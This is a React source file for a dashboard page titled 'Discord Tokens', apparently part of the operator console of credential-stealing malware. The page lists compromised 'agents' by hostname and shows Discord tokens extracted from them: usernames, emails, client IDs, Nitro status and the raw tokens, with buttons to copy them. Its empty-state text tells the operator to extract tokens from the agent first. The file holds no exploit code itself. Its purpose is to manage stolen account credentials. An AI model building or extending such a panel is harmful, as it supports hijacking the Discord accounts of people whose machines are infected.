import { useEffect, useState } from 'react'
import { useStore } from '@/stores/useStore'
import { api } from '@/services/api'
import { GradientBackground } from '@/components/ui/GradientBackground'
import { GradientText } from '@/components/ui/GradientText'
import { DotGrid } from '@/components/ui/DotGrid'
import { Button } from '@/components/ui/Button'
import { Card, CardHeader, CardContent } from '@/components/ui/Card'
import { MessageSquare, Search, RefreshCw, Copy, Trash2, Eye, Download, Link } from 'lucide-react'
import { formatDistanceToNow } from 'date-fns'
import clsx from 'clsx'

export function DiscordTokensPage() {
  const { agents, selectedAgent, discordTokens, fetchDiscordTokens, addNotification } = useStore()
  const [loading, setLoading] = useState(false)
  const [searchQuery, setSearchQuery] = useState('')

  useEffect(() => {
    if (selectedAgent) {
      loadTokens()
    }
  }, [selectedAgent])

  const loadTokens = async () => {
    if (!selectedAgent) return
    setLoading(true)
    try {
          await fetchDiscordTokens(selectedAgent.ID)
    } catch (error) {
      addNotification({ type: 'error', message: `Failed to load Discord tokens: ${error}` })
    } finally {
      setLoading(false)
    }
  }

  const filtered = discordTokens.filter((t) => {
    if (!searchQuery) return true
    const q = searchQuery.toLowerCase()
    return t.Username?.toLowerCase().includes(q) || t.Email?.toLowerCase().includes(q) || t.ClientID?.toLowerCase().includes(q)
  })

  return (
    <GradientBackground>
      <div className="p-6 space-y-6">
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
          <div>
            <div className="flex items-center gap-3">
              <div className="relative w-10 h-10 rounded-xl bg-dark-800/50 border border-dark-700 flex items-center justify-center overflow-hidden">
                <DotGrid className="absolute inset-0" dotSize={2} gap={8} baseColor="#1e293b" activeColor="#d946ef" proximity={50} />
                <MessageSquare className="w-5 h-5 text-accent-400 relative z-10" />
              </div>
              <GradientText className="text-3xl font-bold" colors={['#f8fafc', '#d946ef', '#a855f7']}>
                Discord Tokens
              </GradientText>
            </div>
            <p className="text-dark-400 mt-1">{selectedAgent?.hostname || 'No agent selected'} • {discordTokens.length} total</p>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="ghost" onClick={loadTokens} disabled={loading}>
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
            </Button>
          </div>
        </div>

        <Card className="bg-dark-800/50 border-dark-700 mb-4">
          <CardContent className="p-4">
            <div className="relative max-w-md">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-dark-500" />
              <input
                type="text"
                placeholder="Search tokens..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="w-full pl-10 pr-4 py-2 bg-dark-900 border border-dark-700 rounded-lg text-dark-100 placeholder-dark-500 focus:outline-none focus:ring-2 focus:ring-accent-500"
              />
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardContent className="p-0">
            {loading ? (
              <div className="p-8 text-center">
                <RefreshCw className="w-8 h-8 text-accent-400 animate-spin mx-auto mb-2" />
                <p className="text-dark-400">Loading tokens...</p>
              </div>
            ) : filtered.length === 0 ? (
              <div className="p-16 text-center">
                <div className="relative w-16 h-16 mx-auto mb-4">
                  <DotGrid className="absolute inset-0" dotSize={3} gap={16} baseColor="#1e293b" activeColor="#d946ef" proximity={80} />
                  <MessageSquare className="w-8 h-8 text-dark-600 relative mx-auto" />
                </div>
                <h3 className="text-lg font-medium text-dark-300 mb-1">No Discord tokens found</h3>
                <p className="text-dark-500">Extract tokens from the agent first</p>
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b border-dark-800 bg-dark-900/50">
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Username</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Email</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Client ID</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Nitro</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400">Token</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-40">Extracted</th>
                      <th className="px-4 py-3 text-left font-medium text-dark-400 w-12"></th>
                    </tr>
                  </thead>
                  <tbody>
                    {filtered.map((token) => (
                      <tr key={token.ID} className="border-b border-dark-800/50 hover:bg-dark-800/50">
                        <td className="px-4 py-3 text-dark-100 font-mono text-sm">{token.Username || '-'}</td>
                        <td className="px-4 py-3 text-dark-400 text-sm">{token.Email || '-'}</td>
                        <td className="px-4 py-3 text-dark-400 text-sm font-mono">{token.ClientID || '-'}</td>
                        <td className="px-4 py-3">
                          <span className={clsx("px-2 py-1 rounded text-xs font-medium", token.Nitro ? 'bg-pink-600/20 text-pink-400' : 'bg-dark-700 text-dark-500')}>
                            {token.Nitro ? 'Nitro' : 'Free'}
                          </span>
                        </td>
                        <td className="px-4 py-3">
                          <span className="font-mono text-sm text-dark-300 bg-dark-900 px-2 py-1 rounded select-all" onClick={() => navigator.clipboard.writeText(token.Token)}>
                            {token.Token.slice(0, 30)}{token.Token.length > 30 ? '...' : ''}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-dark-400 text-sm">
                          {token.CreatedAt ? formatDistanceToNow(new Date(token.CreatedAt), { addSuffix: true }) : '-'}
                        </td>
                        <td className="px-4 py-3">
                          <button onClick={() => navigator.clipboard.writeText(JSON.stringify(token, null, 2))} className="p-1.5 rounded bg-dark-800 hover:bg-dark-700 text-dark-400 hover:text-accent-400 transition-colors" title="Copy All">
                            <Copy className="w-4 h-4" />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </GradientBackground>
  )
}